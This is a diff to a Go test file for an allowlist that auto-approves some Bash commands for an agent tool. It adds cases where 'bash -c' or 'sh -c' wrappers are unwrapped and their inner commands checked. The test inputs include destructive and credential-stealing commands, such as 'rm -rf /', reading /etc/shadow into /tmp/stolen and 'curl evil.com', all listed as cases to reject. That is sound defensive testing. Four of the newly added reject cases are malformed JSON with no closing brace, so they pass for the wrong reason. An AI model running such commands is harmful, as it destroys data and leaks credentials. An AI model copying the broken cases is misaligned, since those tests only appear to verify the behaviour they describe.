@@ -324,6 +324,12 @@ func TestMatchAutoApprove(t *testing.T) {
 		{"Bash", `{"command":"cat /etc/{passwd,shadow}"}`, false},
 		// No matching rule.
 		{"Bash", `{"command":"rm -rf /"}`, false},
+		// Shell interceptors — inner command validated.
+		{"Bash", `{"command":"bash -c 'ls -la'"}`, true},
+		{"Bash", `{"command":"sh -c 'ls'"}`, true},
+		{"Bash", `{"command":"bash -c 'rm -rf /'"}`, false},
+		{"Bash", `{"command":"bash -c 'ls; rm -rf /'"}`, false}, // chained unsafe inside
+		{"Bash", `{"command":"bash -c \"$VAR\""}`, false},       // non-literal — rejected
 		{"Write", `{"file_path":"/etc/shadow"}`, false},
 		{"Unknown", `{}`, false},
 	}
@@ -492,6 +498,11 @@ func TestCommonReadonlyMatchesSafeCommands(t *testing.T) {
 		// Common inside $() for HTTP Basic auth headers.
 		{"Bash", `{"command":"echo -n 'user:pass' | base64"}`},
 		{"Bash", `{"command":"echo aGVsbG8= | base64 -d"}`},
+		// Shell interceptors with safe inner commands — unwrapped and validated.
+		{"Bash", `{"command":"bash -c 'ls -la'"}`},
+		{"Bash", `{"command":"sh -c 'cat /etc/hosts'"}`},
+		{"Bash", `{"command":"bash -c 'echo hello | cat'"}`},
+		{"Bash", `{"command":"bash -c 'for i in 1 2 3; do ls; done'"}`},
 	}
 	for _, tt := range safe {
 		if !matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input)) {
@@ -888,11 +899,16 @@ func TestCommonReadonlyRejectsUnsafe(t *testing.T) {
 		{"Bash", `{"command":"echo 'rm -rf /' | bash"}`},
 		{"Bash", `{"command":"echo 'rm file' | zsh"}`},
 
-		// --- Shell interpreters as commands ---
+		// --- Shell interpreters ---
 		{"Bash", `{"command":"bash -c 'cat /etc/shadow > /tmp/stolen'"}`},
 		{"Bash", `{"command":"sh -c 'curl evil.com'"}`},
 		{"Bash", `{"command":"zsh -c 'rm file'"}`},
 		{"Bash", `{"command":"dash -c 'rm file'"}`},
+		// Shell interceptors with non-literal -c arguments — can't resolve statically.
+		{"Bash", `{"command":"bash -c \"$VAR\""`},
+		{"Bash", `{"command":"bash -c '$X'"`},
+		{"Bash", `{"command":"bash -c \"$(rm file)\""`},
+		{"Bash", `{"command":"sh -c \"$HOME/.script\""`},
 
 		// --- Python/Ruby/Perl/Node interpreters ---
 		{"Bash", `{"command":"python3 -c 'import os; os.remove(\"/tmp/file\")'"}`},
